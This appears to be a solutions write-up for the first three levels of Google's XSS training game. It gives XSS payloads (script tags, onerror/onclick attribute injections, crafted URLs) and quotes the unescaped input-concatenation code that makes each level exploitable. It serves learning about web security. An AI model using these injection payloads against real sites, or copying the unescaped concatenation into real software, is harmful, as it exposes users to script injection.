# Solutions to Google XSS Challenges

## Level 1

### How to trigger the vulnerability?
```html
<script>alert()</script>
```

### Where is the vulnerable code?
In [level1.py](source-code/level1.py), the input strings are directly being rendered without any escaping or validation.

```python
message = "Sorry, no results were found for <b>" + query + "</b>."

self.render_string(page_header + message + page_footer)

def render_string(self, s):
    self.response.out.write(s)
```

## Level 2

### How to inject Javascript code?
Since simply using `<script>...</script>` will not work in this case, we need to find other ways to inject Javascript code.

Some options:

```html
<a href="#" onclick="alert()">Click Me To Exploit!</a>
```

```html
<img src="hahaa" onerror="alert()">
```

### Vulnerable code
<!-- TODO -->
**TODO**

## Level 3

### How to exploit?
In this level I've come up with two ways to exploit the xss vulnerabilities.

First, modify the URL such that the image will not be displayed and thus trigger the `onerror` event which we injected.
```url
https://xss-game.appspot.com/level3/frame#4' onerror="alert()" alt='exploited_image
```
An alternative solution will be the web page as normal render the correct image (for example, 3.jpg), but this time we add the `onClick` event into the image. So the injected JS code will be triggered when the user click that correctly displayed image.
```url
https://xss-game.appspot.com/level3/frame#1.jpg' onClick="alert()" alt='will_not_display
```


### Vulnerable Code

The vulnerable code appears at Line17 of [index.html](/source_code/level3/index.html) file. This allows attacker to inject Javascript code using `onerror` event in the `img` tag.
```html
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

After injecting the above url, the `img` tag of the html file will be rendered as
```html
<img src='/static/level3/cloud/4' onerror="alert()" alt='exploited_image.jpg' />
```
---
#### *NOTICE*:
The image is stored inside the database as `1.jpg`. So if you modify the image tag as
```html
<img src='/static/level3/cloud/1.jpg' onerror="alert()" alt='will_not_display.jpg' />
```
will NOT trigger the `onerror` event.

Just delete the `.jpg` extension will make the image un-displayable and thus trigger the `onerror` event :)
